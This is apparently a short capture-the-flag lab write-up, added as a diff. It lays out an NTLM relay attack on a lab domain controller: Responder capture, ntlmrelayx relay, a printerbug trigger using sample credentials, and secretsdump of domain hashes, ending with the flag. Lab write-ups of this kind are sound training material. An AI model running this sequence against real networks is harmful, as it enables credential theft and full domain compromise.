@@ -1,0 +1,31 @@
+Side Mission: Relay Scope
+
+Target Environment: corp.infra.local
+DC IP: 10.10.10.10
+
+Objective:
+Use NTLM relay to capture and reflect authentication attempts to dump domain secrets.
+
+Tools Used:
+- Responder
+- ntlmrelayx.py
+- secretsdump.py
+
+Steps:
+1. Launch Responder to capture NTLMv2 challenge:
+   sudo responder -I eth0
+
+2. Create targets.txt:
+   smb://10.10.10.10
+
+3. Launch ntlmrelayx with target file:
+   sudo ntlmrelayx.py -tf targets.txt -smb2support
+
+4. Wait for inbound auth or trigger with:
+   python3 printerbug.py corp/j.smith:Password123 10.10.10.25
+
+5. If successful, use secretsdump:
+   secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee:4dc3b6... administrator@10.10.10.10
+
+Flag is stored in comment field of dumped hash:
+CTF{ntlm_r3fl3ct_br34k}
